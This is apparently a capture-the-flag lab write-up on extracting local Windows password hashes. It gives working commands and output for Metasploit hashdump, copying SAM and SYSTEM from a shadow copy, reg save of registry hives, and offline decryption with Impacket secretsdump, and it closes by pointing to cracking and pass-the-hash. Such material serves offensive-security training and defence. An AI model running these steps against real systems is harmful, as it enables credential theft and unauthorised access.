# LAB — Extracting Local Windows Credentials

> [!abstract] TL;DR
> Local user hashes live in the **SAM** database (`C:\Windows\System32\config\SAM`), encrypted with a key stored in the **SYSTEM** hive. The SAM is **locked while Windows runs**, so you cannot copy it directly. Three ways to dump it (all require **admin**): Metasploit `hashdump` (in-memory), **Volume Shadow Copy (VSS)**, or **`reg save`**. Then decrypt offline with Impacket `secretsdump` using both `sam` + `system`.
> MITRE: *OS Credential Dumping* related techniques.

---

## Local vs Domain Accounts

Windows has two user account types:
- **Local** — details stored locally in the Windows file system (**SAM** database).
- **Domain** — details stored centrally in Active Directory.

This task covers **local** account credentials.

## Security Account Manager (SAM)

The **SAM** is a Microsoft Windows database storing local account info (usernames + password hashes) in **encrypted** form. It **cannot be read or copied while Windows is running** because it is permanently locked/in-use by the OS.

Confirm you cannot read or copy it directly:

```shell-session
C:\Windows\system32>type c:\Windows\System32\config\sam
The process cannot access the file because it is being used by another process.

C:\Windows\System32> copy c:\Windows\System32\config\sam C:\Users\Administrator\Desktop\
The process cannot access the file because it is being used by another process.
        0 file(s) copied.
```

> [!info] Decryption requires the SYSTEM hive
> Even if you extract the raw SAM, it is encrypted (RC4 or AES). The decryption **syskey / boot key** is stored in the **`SYSTEM`** hive, located in the same directory:
> ```
> C:\Windows\System32\config\
> ```
> In-memory tools (Mimikatz) extract the system key automatically. **Manual disk-based extraction requires capturing both `SAM` and `SYSTEM`.**

> [!tip] Keystroke logging (alternative)
> A keylogger (software/hardware) can harvest credentials in a busy interactive environment. If a compromised host has a logged-in user, keylogging via Metasploit or other tools is a good option.

## Method 1 — Metasploit `hashdump`

Metasploit's built-in `hashdump` uses **in-memory code injection into `lsass.exe`** to dump a copy of the SAM database content. On a domain-joined target it can also extract domain user credentials.

```shell-session
meterpreter > getuid
Server username: THM\Administrator
meterpreter > hashdump

Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:ec44ddf5ae100b898e9edab74811430d:::

```

## Method 2 — Volume Shadow Copy (VSS)

VSS creates a **point-in-time snapshot** of the whole `C:` drive — an offline, unlocked copy of the SAM database you can freely read. **Requires administrator privileges.** Open **cmd as administrator** first.

**Steps:** run elevated cmd → create a shadow copy of `C:` → verify it → copy SAM + SYSTEM out of the snapshot.

### Create the shadow copy with WMIC

```
wmic shadowcopy call create Volume='C:\'
```

> [!warning] `Initialization failure` error
> Occurs when cmd is **not** elevated. Close it, right-click `cmd.exe` → **Run as administrator**, and rerun.

Successful output:

```shell-session
C:\Users\Administrator>wmic shadowcopy call create Volume='C:\'
Executing (Win32_ShadowCopy)->create()
Method execution successful.
Out Parameters:
instance of __PARAMETERS
{
        ReturnValue = 0;
        ShadowID = "{D8A11619-474F-40AE-A5A0-C2FAA1D78B85}";
};
```

### Verify with `vssadmin`

```
vssadmin list shadows
```

```shell-session
C:\Users\Administrator>vssadmin list shadows
vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
(C) Copyright 2001-2013 Microsoft Corp.

Contents of shadow copy set ID: {0c404084-8ace-4cb8-a7ed-7d7ec659bb5f}
   Contained 1 shadow copies at creation time: 5/31/2022 1:45:05 PM
      Shadow Copy ID: {d8a11619-474f-40ae-a5a0-c2faa1d78b85}
         Original Volume: (C:)\\?\Volume{19127295-0000-0000-0000-100000000000}\
         Shadow Copy Volume: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
         Originating Machine: Creds-Harvesting-AD.thm.red
         Service Machine: Creds-Harvesting-AD.thm.red
         Provider: 'Microsoft Software Shadow Copy provider 1.0'
         Type: ClientAccessible
         Attributes: Persistent, Client-accessible, No auto release, No writers, Differential
```

The snapshot's **Shadow Copy Volume Name** acts as the root device path — it replaces `C:\` when addressing files inside the snapshot:

```
\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```

### Copy SAM and SYSTEM out of the snapshot

```shell-session
C:\Users\Administrator>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\Administrator\Desktop\sam
        1 file(s) copied.

C:\Users\Administrator>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\users\Administrator\Desktop\system
        1 file(s) copied.
```

> [!note] Both files are mandatory
> Capturing only SAM is insufficient — without the corresponding SYSTEM hive the stored hashes cannot be decrypted. (If the SYSTEM copy returns a `cannot find file` error in a specific instance, it's a path/system anomaly; under normal conditions `Windows\System32\config\SYSTEM` copies out fine.)

## Method 3 — `reg save` (faster alternative)

VSS involves multiple steps and long device paths. With local admin you can dump active registry hives directly to disk — no snapshots needed. (The file size may differ from a VSS copy, but the cryptographic data is identical.)

```shell-session
reg save HKLM\sam C:\users\Administrator\Desktop\sam
reg save HKLM\system C:\users\Administrator\Desktop\system
```

Lab example (saving to distinct names):

```shell-session
C:\Users\Administrator\Desktop>reg save HKLM\sam C:\users\Administrator\Desktop\sam-reg
The operation completed successfully.

C:\Users\Administrator\Desktop>reg save HKLM\system C:\users\Administrator\Desktop\system-reg
The operation completed successfully.
```

> [!tip] File sizes
> The SAM hive is small; the SYSTEM hive is noticeably larger (~16–20 MB+) and takes a moment to write. Both files are required.

## Decrypt Offline — Impacket `secretsdump`

`secretsdump` extracts credentials from local SAM hives (and AD `ntds.dit`) locally or remotely.

```
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam -system system LOCAL
```

Or using the packaged wrapper:

```
impacket-secretsdump -sam sam -system system LOCAL
```

**Arguments:**
- **`-sam`** — path to the harvested SAM file
- **`-system`** — path to the harvested SYSTEM hive (provides the decryption key)
- **`LOCAL`** — perform offline local parsing (not a remote network extraction)

Output (NTLM hashes as `uid:rid:lmhash:nthash`):

```
┌──(kali㉿kali)-[~/Downloads]
└─$ impacket-secretsdump -sam sam -system system LOCAL
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:98d3a787a80d08385cea7fb4aa2a4261:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Cleaning up...
```

> [!warning] Local SAM vs Domain accounts
> Comparing this output to Metasploit's `hashdump`, the results differ. The extra accounts belong to **Active Directory** and are **not** stored in the SYSTEM hive we dumped. To decrypt AD accounts you also need the **`SECURITY`** hive (covered in the Domain Controller task).

Once you have NTLM hashes, you can crack them with Hashcat (if guessable) or use them directly for Pass-the-Hash impersonation.
